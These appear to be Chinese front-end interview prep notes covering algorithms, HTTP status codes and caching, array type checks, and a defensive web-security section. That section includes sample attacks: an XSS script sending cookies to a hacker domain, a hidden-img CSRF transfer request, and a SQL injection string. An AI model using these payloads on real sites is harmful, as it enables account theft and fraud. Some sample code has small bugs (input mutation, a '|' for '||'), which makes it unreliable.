# 前端开发

## （二）面试题

### 1、平常有没有用node

### 2、

### 3、询问简历中的交易所项目，订单薄，高频渲染性能

k线图，长连接，短连接，懒加载，首屏加载

### 4、在 Web 性能监控时，你关注哪些指标？如何获取这些数据？

### 5、项目中说到用了 WebSocket 做断线重连加心跳检测。可以说一下这个具体是怎做什么吗？

### 6、编程题1：数组 A，B，实现一个方法，然后判断 A 是 B 的子集

```javascript
// 1. a,b 2个有序数组，a的长度小于等于b
// 2. 元素都是整数
// 3. 存在重复元素
// 实现一个方法，判断a是否为b的子集
// 例如：
// a: [1,2,3] b:[1,2,3,4] 属于
// a: [1,1,2,2] b[1,2,3,4] 不属于
// a: [1,3,3,5] b: [1,2,3,3,5,5] 属于
// a: [1,3,3,5] b: [1,3,5,5] 不属于
function isSubset(a, b) {
    if (a.length === 0) {
        return true;
    }
    // 检查数据
    for (const item of a) {
        if (!b.includes(item)) {
            return false;
        }
        // 删除重复元素
        b.splice(b.indexOf(item), 1);
    }
    return true;
}

let a = [1, 3, 3, 5];
let b = [1, 2, 3, 3, 5, 5];

// let a = [];
// let b = [1, 2, 3, 4];
// console.log(isSubset(a, b));
```

### 7、这个算法的时间复杂度是多少

设：

n = a.length
m = b.length

逐行分析：

b.includes(item)：需要遍历 b 查找，时间复杂度 O(m)
b.indexOf(item)：同样需要遍历 b 查找，时间复杂度 O(m)
b.splice(index, 1)：删除数组中间元素需要移动后续所有元素，时间复杂度 O(m)

对于 a 中的每个元素，这三步的总时间复杂度是 O(m + m + m) = O(3m) = O(m)

由于要对 a 中的每个元素执行上述操作，总时间复杂度为：O(n × m)

最坏情况
当 a 是 b 的子集时，需要处理 a 的所有元素，是最坏情况：

n = a.length
m = b.length

时间复杂度：O(n × m)

空间复杂度  只使用了常数级别的额外变量
空间复杂度：O(1)

### 8、算法中涉及到的b.includes的时间复杂度是多少

b.includes(item)：需要遍历 b 查找，时间复杂度 O(m)

### 9、编程题2：用递归的方式实现 fibonacci(n)函数， 斐波那契数列，为什么需要缓存

为什么需要缓存 - 核心原因
1)避免指数级重复计算
   无缓存：O(2^n) 时间复杂度
   有缓存：O(n) 时间复杂度

2)性能提升巨大
    计算 F(30)：
        无缓存：约 270万次函数调用
        有缓存：仅 31次函数调用

3)解决重叠子问题
    斐波那契数列是典型的重叠子问题结构
    大问题的解依赖于相同小问题的重复计算

缓存在这个算法中是必要的优化手段，它通过存储已计算结果，将算法从指数时间复杂度 O(2^n) 优化到线性时间复杂度 O(n)，解决了递归斐波那契数列的核心性能问题。

```javascript
// 输入数字 n，输出波菲那契数列第 n 项数字，并给该函数加 入缓存功能.

//     注:波菲那契数列是指第 0 项为 0，第一项为 1，第 n 项（n > 1）=第 n - 2 项 + 第 n - 1 项的数列
// 输入 输出
// 1 -- -> 1
// 2 -- -> 1
// 3 -- -> 2
// 4 -- -> 3
// 5 -- -> 5
// 6 -- -> 8

function fibonacci(n) {
    if (n < 2) {
        return n;
    }
    // 缓存
    const cache = {
        0: 0,
        1: 1
    }

    function calcFib(num) {
        // console.log(num)
        if (typeof num !== 'number' | num < 0 || !Number.isInteger(num)) {
            return '数据有误';
        }
        // 有缓存
        if (cache[num] !== undefined) {
            // console.log('有缓存--', cache[num]);
            return cache[num];
        }
        // 无缓存
        const result = calcFib(num - 1) + calcFib(num - 2);
        cache[num] = result;
        return result;
    }
    return calcFib(n);
}

console.log(fibonacci(6));
```

这是一个使用**记忆化（Memoization）**优化的斐波那契数列算法。

`算法逻辑分析`

1. 使用 `cache` 对象存储已计算的斐波那契数
2. 递归计算，但优先从缓存中取值
3. 每个斐波那契数只计算一次

`时间复杂度分析`

传统递归斐波那契（无记忆化）

- 时间复杂度：O(2^n) - 指数级
- 原因：存在大量重复计算

记忆化递归斐波那契（当前算法）

**关键点：** 每个斐波那契数 `F(n)` 只计算一次

设 `n` 为输入的参数：

1. **计算每个 F(k) 时：**
   - 检查缓存：O(1)
   - 如果没有缓存，递归计算 F(k-1) + F(k-2)
   - 存储结果到缓存：O(1)

2. **总计算量：**
   - 需要计算 F(0), F(1), F(2), ..., F(n)
   - 总共 n+1 个不同的斐波那契数
   - 每个数只计算一次

3. **时间复杂度：**
   - 每个斐波那契数的计算是 O(1) 操作（因为子问题结果已缓存）
   - 总共需要计算 n+1 个不同的值
   - **时间复杂度：O(n)**

空间复杂度分析

1. **缓存空间：** 存储 F(0) 到 F(n)，共 n+1 个值 → O(n)
2. **递归调用栈：** 最坏情况下深度为 n → O(n)
3. **总空间复杂度：O(n)**

- **时间复杂度：O(n)** - 线性时间
- **空间复杂度：O(n)** - 线性空间
- **优化效果：** 从指数级 O(2^n) 优化到线性级 O(n)

这是一个典型的**用空间换时间**的优化策略，通过记忆化技术避免了重复计算，大幅提升了算法效率。

### 10、http的状态码有知道哪些？

### 11、3开头的状态码有哪些？

301 moved permanently 永久重定向
核心含义：请求的资源永久迁移到了新地址，后续所有请求都应直接访问新地址。
典型场景：
网站域名更换（如 old.com 迁移到 new.com，访问 old.com/page 会 301 到 new.com/page）；
页面路径永久调整（如 /blog/old-title 改为 /blog/new-title）。
关键特性：浏览器会缓存新地址，下次再访问原地址时，会直接跳转到新地址（无需再发请求给服务器），适合 “永久变更” 的场景。
302 found 临时重定向
核心含义：请求的资源临时迁移到了新地址，后续请求仍需访问原地址（新地址可能随时变）。
典型场景：
临时维护页面（访问正常地址时，临时 302 到 /maintenance 页面，维护结束后恢复）；
登录跳转（未登录用户访问需权限的页面时，302 到登录页，登录成功后再跳回原页面）。
关键特性：浏览器不缓存新地址，每次访问原地址都会发请求给服务器，由服务器决定是否重定向，适合 “临时变更” 的场景。
304 Not Modified（未修改，协商缓存命中）
核心含义：请求的资源自上次获取后未发生变化，服务器无需返回资源内容，客户端直接使用本地缓存的资源即可。
典型场景：
静态资源（如 CSS、JS、图片）的缓存（客户端首次获取资源后，会记录 Last-Modified 或 ETag；下次请求时携带这些信息，服务器判断资源未变，返回 304，减少带宽消耗）；
频繁访问但很少更新的页面（如博客文章详情页）。
关键特性：这是 “性能优化核心状态码”，仅返回响应头（无响应体），大幅减少数据传输量，是前端静态资源缓存的核心机制之一。

### 12、4开头的状态码有哪些？

401 Unauthorized（未授权，登录态失效 / 未登录）
核心场景：你说的 “5 分钟后登录态失效，点击跳转” 就对应这个状态码。
比如数字资产平台，用户登录态过期后，点击 “查看我的资产”：
客户端发送请求时，携带的 Token 已过期（或没带 Token）；
服务器验证 Token 无效，返回 401 状态码；
前端收到 401 后，触发 “登录态失效” 逻辑（比如清空本地 Token，自动重定向到登录页）。
关键区别：401 是 “没证明身份”（比如没登录、Token 无效），解决方式是让用户重新登录。
2. 403 Forbidden（禁止访问，权限不足）
核心场景：用户已登录，但没有操作某资源的权限。
比如普通用户想访问数字资产平台的 “管理员后台”（/admin）：
用户登录后，携带有效 Token 请求 /admin；
服务器验证 Token 有效，但该用户角色是 “普通用户”，没有管理员权限，返回 403 状态码；
前端收到 403 后，通常显示 “无权限访问” 页面（而不是跳登录页，因为用户已登录，只是权限不够）。
和 401 区分：401 是 “没登录 / 登录态无效”，403 是 “已登录但没权限”。
3. 404 Not Found（资源未找到，地址错 / 资源删了）
最常见场景：用户访问的地址不存在（比如输错 URL、页面已删除）。
比如用户想访问数字资产的 “BTC-USDT 交易页”，但 URL 输成了 /trade/BTC-USD（多写了个 D）：
客户端请求 /trade/BTC-USD；
服务器找不到这个路径对应的资源，返回 404 状态码；
前端收到 404 后，显示 “页面不存在” 的 404 页面（比如引导用户返回首页）。
4. 400 Bad Request（请求参数错误，格式 / 内容不对）
核心场景：客户端发送的请求参数有问题（比如格式错、缺少必填项）。
比如用户在数字资产平台 “下单”，请求时没传 “交易数量”（必填参数）：
客户端发送下单请求，参数里少了 amount（数量）字段；
服务器校验参数时发现缺失必填项，返回 400 状态码，同时在响应体里说明错误（比如 {"error":"缺少必填参数：amount"}）；
前端收到 400 后，提示用户 “请填写交易数量”（不用跳页，直接在当前页显示错误）。
5. 408 Request Timeout（请求超时，客户端发送请求太慢）
核心场景：客户端发送请求后，服务器等了太久（比如超过 30 秒）还没收到完整的请求数据。
比如用户在网络极差的环境下，上传 “交易凭证图片”，数据传了一半卡住：
客户端开始上传图片，但网络中断，服务器长时间没收到完整数据；
服务器触发超时机制，返回 408 状态码；
前端收到 408 后，提示用户 “网络超时，请重试”（比如让用户重新上传图片）。

### 13、2开头的状态码

200 成功

### 14、http的缓存机制

强制缓存
协商缓存

### 15、http和https的区别？

加密，端口号：http是80，https是443；证书要求：http没有证书要求，Https必须在服务器端部署SSL证书

### 16、https的加密过程？

### 17、跨域？

### 18、同源策略？

同源策略 是浏览器实施的一种核心安全机制。它规定了 从一个源加载的文档或脚本，如何与来自另一个源的资源进行交互。

### 19、有哪些方法可以解决跨域？

### 20、给你一个变量，怎么判断这个变量是不是数组？

**5种常用且各有优劣的方法**，覆盖不同场景需求，核心是区分“数组”与“类数组（如 `arguments`、`NodeList`）”和“普通对象”：

1. `Array.isArray(arr)`（最推荐，ES5+ 支持，精准无坑）

- **核心原理**：ES5 新增的数组静态方法，专门判断变量是否为“标准数组”，无视原型链和上下文。  
- **用法**：

  ```javascript
  const arr = [1, 2, 3];
  const obj = { a: 1 };
  console.log(Array.isArray(arr)); // true
  console.log(Array.isArray(obj)); // false
  console.log(Array.isArray(null)); // false（处理 null/undefined 不报错）
  ```

- **优点**：简单、精准，不会把类数组（如 `document.querySelectorAll('div')`）误判为数组，也不受 `Array.prototype` 被修改的影响。  
- **适用场景**：所有现代浏览器/环境（IE9+ 支持），日常开发首选。

2. `arr instanceof Array`（常用，但有原型链漏洞）

- **核心原理**：判断“数组实例的原型链上是否有 `Array.prototype`”，本质是检查实例与构造函数的关系。  
- **用法**：

  ```javascript
  const arr = [1, 2, 3];
  console.log(arr instanceof Array); // true
  console.log({} instanceof Array); // false
  ```

- **缺点**：  
  - 若数组的原型链被修改（如 `arr.__proto__ = Object.prototype`），会误判为 `false`；  
  - 在 iframe 跨窗口场景中，不同窗口的 `Array` 是不同的构造函数，会把另一个窗口的数组误判为 `false`。  
- **适用场景**：简单场景（如本地非跨窗口、不修改原型链），不推荐作为唯一判断方式。

3. `Object.prototype.toString.call(arr) === '[object Array]'`（最严谨，兼容旧环境）

- **核心原理**：利用 `Object.prototype.toString()` 会返回“`[object 类型]`”格式的字符串，且该方法不受原型链修改影响（除非手动重写）。  
- **用法**：

  ```javascript
  const arr = [1, 2, 3];
  const nodeList = document.querySelectorAll('div'); // 类数组
  console.log(Object.prototype.toString.call(arr)); // "[object Array]" → true
  console.log(Object.prototype.toString.call(nodeList)); // "[object NodeList]" → false
  ```

- **优点**：兼容性极强（IE6+ 支持），可精准区分数组、类数组、普通对象，是“终极兜底方案”。  
- **缺点**：写法略繁琐，可封装成工具函数（如 `const isArr = (v) => Object.prototype.toString.call(v) === '[object Array]'`）。  
- **适用场景**：需要兼容旧浏览器（如 IE），或对判断精度要求极高的场景。

4. `arr.constructor === Array`（不推荐，易被篡改）

- **核心原理**：判断变量的 `constructor` 属性是否指向 `Array` 构造函数（数组实例的 `constructor` 默认是 `Array`）。  
- **用法**：

  ```javascript
  const arr = [1, 2, 3];
  console.log(arr.constructor === Array); // true
  ```

- **缺点**：`constructor` 是可手动修改的（如 `arr.constructor = Object`），会直接导致判断失效；且 `null/undefined` 没有 `constructor` 属性，调用时会报错。  
- **适用场景**：几乎不用，仅作了解即可。

### 5. 排除法：`typeof arr === 'object' && arr.length !== undefined`（不精准，慎用）

- **核心原理**：数组的 `typeof` 结果是 `object`，且有 `length` 属性，试图通过这两个特征判断。  
- **用法**：

  ```javascript
  const arr = [1, 2, 3];
  const str = 'abc'; // 字符串也有 length 属性
  console.log(typeof arr === 'object' && arr.length !== undefined); // true
  console.log(typeof str === 'object' && str.length !== undefined); // false（但类数组会误判）
  ```

- **缺点**：会把类数组（如 `arguments`、`NodeList`）和有 `length` 属性的普通对象（如 `{ length: 3 }`）误判为数组，精度极低。  
- **适用场景**：绝对不推荐，仅作为反面案例了解。

总结：日常开发怎么选？

| 方法  | 兼容性 | 精准度 | 推荐度 |
|------|--------|--------|--------|
| `Array.isArray(arr)`  | IE9+   | ★★★★★  | ★★★★★  |
| `Object.prototype.toString.call(arr)` | IE6+ | ★★★★★  | ★★★★☆  |
| `arr instanceof Array`  | 所有   | ★★★☆☆  | ★★★☆☆  |
| 其他方法            | -      | ★☆☆☆☆  | ★☆☆☆☆  |

**一句话结论**：现代项目直接用 `Array.isArray(arr)`；需要兼容 IE6-8 就用 `Object.prototype.toString.call(arr)`，其他方法尽量不用。

### 21、Node 里面的那个ESM（ECMAScript Module，ES 模块）跟 com- ### CommonJS 有了解过吗？

### 22、常见的 web 安全有了解吗？有哪些 web 安全是需要平常去注意的？

日常开发中需要重点关注的 Web 安全问题，核心是防范“黑客利用漏洞窃取数据、篡改页面或攻击服务器”，以下是 **6个高频且必须注意的安全点**，结合业务场景说明如何规避：

1. XSS（跨站脚本攻击）：警惕“用户输入的恶意代码”

- **原理**：黑客通过评论、表单等用户输入场景，注入恶意 JS 代码（比如 `<script>窃取Cookie的代码</script>`），浏览器执行后窃取用户信息（如登录态、账号密码）。  
- **常见场景**：  
  - 数字资产平台的“社区评论区”：用户输入 `<script>document.location.href='http://黑客域名?cookie='+document.cookie</script>`，其他用户查看评论时，浏览器会执行这段代码，把自己的登录 Cookie 发给黑客。  
  - 表单提交：比如“反馈表单”未过滤输入，黑客注入代码篡改页面。  
- **防范措施**：  
  - 核心：**过滤/转义用户输入**（把 `<` 转成 `&lt;`、`>` 转成 `&gt;` 等，让恶意代码变成“普通文本”）。  
  - 前端：用 `React/Vue` 框架（默认会自动转义用户输入，避免直接用 `innerHTML` 插入内容）；  
  - 后端：对存储到数据库的用户输入做二次过滤，避免“存储型 XSS”（代码存在数据库，每次加载页面都会执行）。

2. CSRF（跨站请求伪造）：防止“伪造用户身份发请求”

- **原理**：黑客诱导用户在“已登录目标网站”的情况下，访问黑客的恶意页面，页面会自动发送“伪造的请求”（比如转账、改密码），利用用户的登录态完成攻击。
- **防范措施**：  
  - 核心：**让请求携带“只有用户和服务器知道的唯一标识”**，避免被伪造。  
  - 方案1：用 `Token`（前端登录后获取 Token，每次发请求在 Header 里带 `Authorization: Bearer Token`，黑客无法获取用户的 Token）；  
  - 方案2：验证 `Referer`（后端检查请求的 `Referer` 头，确认是来自自己的网站，而非黑客域名，注意 `Referer` 可能被篡改，需结合 Token 使用）。

3. 密码安全：绝对不能“明文存储”

- **原理**：如果数据库被黑客攻破，明文存储的密码会直接泄露，用户账号批量被盗（比如早期某平台密码泄露事件，就是因为未加密）。  
- **防范措施**：  
  - 核心：**密码加盐哈希存储**（不可逆加密，即使数据库泄露，黑客也无法还原明文）。  
  - 步骤：  
    1. 用户注册时，后端生成一个随机“盐值”（如 `salt: "a8x7b9"`）；  
    2. 把“密码+盐值”一起用哈希算法（如 `bcrypt`、`SHA-256`）加密，得到哈希值（如 `hash: "xxx..."`）；  
    3. 数据库只存“盐值+哈希值”，不存明文密码；  
    4. 用户登录时，后端用同样的盐值和算法加密输入的密码，对比哈希值是否一致。  
  - 注意：禁用 MD5 算法（已被破解，不安全），优先用 `bcrypt`（自带盐值，且加密速度慢，防暴力破解）。

4. SQL 注入：避免“用户输入篡改 SQL 语句”

- **原理**：黑客在输入框（如登录账号、搜索框）中输入恶意 SQL 片段（比如 `' OR 1=1 --`），让后端执行的 SQL 语句逻辑改变，从而绕过验证或读取数据库数据。  
- **常见场景**：  
  - 登录接口后端代码：`SELECT * FROM user WHERE username='${inputName}' AND password='${inputPwd}'`；  
  - 黑客输入账号 `' OR 1=1 --`，密码随便填，SQL 会变成 `SELECT * FROM user WHERE username='' OR 1=1 --' AND password='xxx'`——`OR 1=1` 让条件永远成立，`--` 注释掉后面的代码，直接登录成功。  
- **防范措施**：  
  - 核心：**用“参数化查询”替代“字符串拼接 SQL”**，让用户输入只能作为“参数”，无法篡改 SQL 结构。  
  - 后端：用 `MySQL` 的 `prepareStatement`、`Node.js` 的 `sequelize`/`typeorm` 等 ORM 框架（自动做参数化处理），禁止手动拼接 SQL。

5. 敏感数据传输：必须用 HTTPS

- **原理**：HTTP 传输数据是明文，黑客可通过“抓包”窃取用户在传输过程中的敏感信息（如登录时的账号密码、支付信息）。  
- **常见场景**：用户用 HTTP 登录数字资产平台，黑客在同一网络（如公共 WiFi）中抓包，直接拿到明文密码。  
- **防范措施**：  
  - 核心：**全站强制使用 HTTPS**（部署 SSL 证书，地址栏显示小绿锁），所有接口和页面都通过 HTTPS 传输。  
  - 额外：后端对“超敏感数据”（如支付密码）做“二次加密”（比如用 RSA 非对称加密），即使 HTTPS 被破解，数据仍有一层保护。

6. 接口限流：防止“恶意请求拖垮服务器”

- **原理**：黑客通过“脚本批量发送请求”（如每秒发 1000 次登录请求、转账请求），导致服务器资源耗尽，无法正常提供服务（DDoS 攻击的简化版），或暴力破解密码（试遍所有可能的密码组合）。  
- **常见场景**：  
  - 登录接口未限流：黑客用脚本循环尝试“账号+不同密码”，暴力破解用户账号；  
  - 转账接口未限流：大量恶意请求导致服务器卡顿，正常用户无法转账。  
- **防范措施**：  
  - 核心：**对接口按“IP/用户ID”设置请求频率限制**。  
  - 方案：  
    1. 用 `Redis` 记录请求次数（如“IP:192.168.1.1 在 1 分钟内只能请求 10 次登录接口”）；  
    2. 超过限制时，返回 `429 Too Many Requests` 状态码，提示“请求过于频繁，请稍后再试”；  
    3. 敏感接口（如登录、支付）可结合“验证码”（图形验证码、短信验证码），进一步防机器人攻击。

总结：日常开发的“安全 checklist”

1. 所有用户输入必须“过滤/转义”，防 XSS；  
2. 敏感请求必须带 Token，防 CSRF；  
3. 密码必须“加盐哈希存储”，禁用明文；  
4. 后端 SQL 必须用参数化查询，防注入；  
5. 全站强制 HTTPS，敏感数据传输加密；  
6. 核心接口必须限流，加验证码防暴力攻击。

### 23、什么是 CSRF？

CSRF（Cross-Site Request Forgery，跨站请求伪造），本质是**黑客利用用户的“已登录状态”，诱导用户在不知情的情况下，向目标网站发送伪造的请求**（比如转账、改密码、发评论），服务器误以为是用户自己操作，从而完成攻击。

**CSRF 能成功的核心条件（缺一个都不行）**

1. **用户必须已登录目标网站**：有登录 Cookie 或 Token 等“身份凭证”，服务器才会认。  
2. **用户必须访问黑客的恶意页面**：需要用户“上钩”（点链接、开邮件附件等）。  
3. **目标网站的接口没做 CSRF 防护**：接口只要“有身份凭证就执行”，不验证请求是不是用户“主动意愿”发起的。

举个最直观的例子（结合数字资产场景）

1. **用户登录目标网站**：你在 `exchange.com`（数字资产平台）登录了账号，浏览器保存了登录 Cookie（此时服务器认定你的浏览器是“可信的”）。  
2. **黑客诱导用户访问恶意页面**：你没退出 `exchange.com`，又不小心点开了黑客发来的链接（比如邮件里的 `hack.com/evil.html`）。  
3. **恶意页面自动发伪造请求**：这个 `evil.html` 里藏了一段隐藏代码，比如：  

   ```html
   <!-- 看似是图片，实际是向 exchange.com 发转账请求 -->
   <img src="https://exchange.com/api/transfer?to=黑客账号&amount=1000&coin=BTC" style="display:none">
   ```

4. **服务器误判为用户操作**：浏览器加载 `img` 时，会自动带着 `exchange.com` 的登录 Cookie 发请求。服务器看到“有登录态”，就认为是你主动发起的转账，直接执行操作——你的 1000 BTC 就被转走。

最常用、最有效的方案是

（一）**“Token 验证”**：  

1. **前端登录后获取 CSRF-Token**：登录 `exchange.com` 时，服务器返回一个随机的、唯一的 `CSRF-Token`（比如存在页面隐藏域或本地存储）  
2. **发请求时带上 Token**：每次发敏感请求（转账、改密码），都要在请求头（或表单）里带上这个 `CSRF-Token`，比如：  

   ```javascript
    // 转账请求示例（Axios）
    axios.post('/api/transfer', 
       { to: '目标账号', amount: 1000 },
       { headers: { 'X-CSRF-Token': '服务器给的随机Token' } }
    );
   ```

3. **服务器验证 Token**：收到请求后，服务器对比“请求带的 Token”和“当前用户会话中存储的 Token”——只有两者一致，才执行操作。  

黑客的恶意页面拿不到用户的 `CSRF-Token`（同源策略限制），发请求时没带有效 Token，服务器就会拒绝，攻击就失败了。

（二） 验证 Referer/Origin 请求头（低成本辅助验证）

- **原理**：`Referer` 头记录了“请求来自哪个页面”，`Origin` 头记录了“请求来自哪个域名”。后端通过检查这两个头，确认请求是否来自自己的网站（而非黑客域名）。  
- **用法**：  
  比如你的数字资产平台域名是 `exchange.com`，后端收到转账请求时，检查 `Referer` 或 `Origin` 是否包含 `exchange.com`：  
  - 若是，说明请求来自自己的页面，正常处理；  
  - 若不是（比如来自 `hack.com`），直接拒绝。  
- **优缺点**：  
  - 优点：无需前端配合，后端改几行代码即可实现，适合快速临时防护；  
  - 缺点：`Referer` 可被部分浏览器/工具篡改（比如隐私模式下可能不发送），`Origin` 在部分场景（如本地文件）可能为空，不能单独作为唯一防护手段，建议和 Token 配合使用。

（三）SameSite Cookie（浏览器层面的防护，推荐配置）

- **原理**：通过设置 Cookie 的 `SameSite` 属性，限制 Cookie 只能在“同站请求”中携带，跨站请求（如黑客网站的请求）不会带上 Cookie，从根源上阻止黑客利用登录态。  
- **`SameSite` 可选值**：  
  - `SameSite=Strict`：仅同站请求（完全一致的域名）才带 Cookie（比如 `exchange.com` 的页面请求 `exchange.com` 接口才带，`sub.exchange.com` 都不算），安全性最高但可能影响正常跨域业务；  
  - `SameSite=Lax`（推荐）：允许“同站请求”和“顶级导航的跨站请求”（比如从 `blog.com` 点击链接跳转到 `exchange.com` 时带 Cookie），但禁止“嵌入在黑客页面里的请求”（如 `<img>`、`<script>` 发起的跨站请求），兼顾安全和用户体验。  
- **用法**：后端在设置登录 Cookie 时，添加 `SameSite=Lax` 属性：  

  ```http
  // 响应头设置示例（Node.js/Express）
  res.cookie('sessionId', '用户的登录凭证', {
    sameSite: 'lax', // 关键配置
    httpOnly: true, // 防止 JS 读取 Cookie（防 XSS）
    secure: true // 仅 HTTPS 传输
  });
  ```  

  这样，黑客页面里的 `<img src="exchange.com/transfer">` 请求，浏览器会自动不带 `sessionId` Cookie，服务器因没登录态而拒绝。  

（二）、前后端完整代码示例（Token 验证方案）

以“数字资产平台转账接口”为例，展示如何用 Token 防范 CSRF：

1. 后端（Node.js/Express）

```javascript
const express = require('express');
const session = require('express-session');
const app = express();

// 1. 初始化会话（存储用户的 CSRF-Token）
app.use(session({
  secret: 'your-secret-key', // 加密会话的密钥
  resave: false,
  saveUninitialized: true,
  cookie: { 
    httpOnly: true, 
    secure: process.env.NODE_ENV === 'production', // 生产环境用 HTTPS
    sameSite: 'lax' // 配合 SameSite 增强安全
  }
}));

// 2. 登录接口：生成并返回 CSRF-Token
app.post('/login', (req, res) => {
  const { username, password } = req.body;
  // 假设验证成功，生成随机 Token 并存到当前会话
  const csrfToken = require('crypto').randomBytes(16).toString('hex');
  req.session.csrfToken = csrfToken; 
  // 返回 Token 给前端（前端存到本地，比如 localStorage 或页面隐藏域）
  res.json({ 
    success: true, 
    csrfToken: csrfToken,
    message: '登录成功'
  });
});

// 3. 转账接口：验证 CSRF-Token
app.post('/api/transfer', (req, res) => {
  const { to, amount } = req.body;
  const clientToken = req.headers['x-csrf-token']; // 前端从请求头传的 Token
  
  // 验证 Token：会话中的 Token 和请求带的 Token 必须一致
  if (!clientToken || clientToken !== req.session.csrfToken) {
    return res.status(403).json({ error: 'CSRF 验证失败，拒绝操作' });
  }
  
  // Token 验证通过，执行转账逻辑
  console.log(`转账成功：${amount} BTC 到 ${to}`);
  res.json({ success: true, message: '转账完成' });
});

app.listen(3000, () => console.log('服务器启动在 3000 端口'));
```

2. 前端（JavaScript）

```html
<!-- 登录页面 -->
<script>
  // 登录成功后保存 CSRF-Token
  async function login() {
    const res = await fetch('/login', {
      method: 'POST',
      body: JSON.stringify({ username: 'user', password: 'pass' }),
      headers: { 'Content-Type': 'application/json' }
    });
    const data = await res.json();
    if (data.success) {
      localStorage.setItem('csrfToken', data.csrfToken); // 存 Token
    }
  }

  // 转账功能：请求头携带 CSRF-Token
  async function transfer() {
    const csrfToken = localStorage.getItem('csrfToken');
    const res = await fetch('/api/transfer', {
      method: 'POST',
      body: JSON.stringify({ to: 'targetAccount', amount: 1000 }),
      headers: { 
        'Content-Type': 'application/json',
        'X-CSRF-Token': csrfToken // 关键：带上 Token
      }
    });
    const data = await res.json();
    console.log(data); // 转账结果
  }
</script>
```

总结

- **核心方案**：`CSRF-Token` 验证（最可靠，前后端配合）；  
- **辅助方案**：`SameSite=Lax` Cookie（浏览器自动拦截，零前端成本） + `Referer/Origin` 检查（低成本补充）；  
- **注意**：这些方案可组合使用（比如 Token + SameSite Cookie），安全性更高。  

这样配置后，黑客即使诱导用户访问恶意页面，也因拿不到 Token 或 Cookie 不被携带，无法完成 CSRF 攻击。
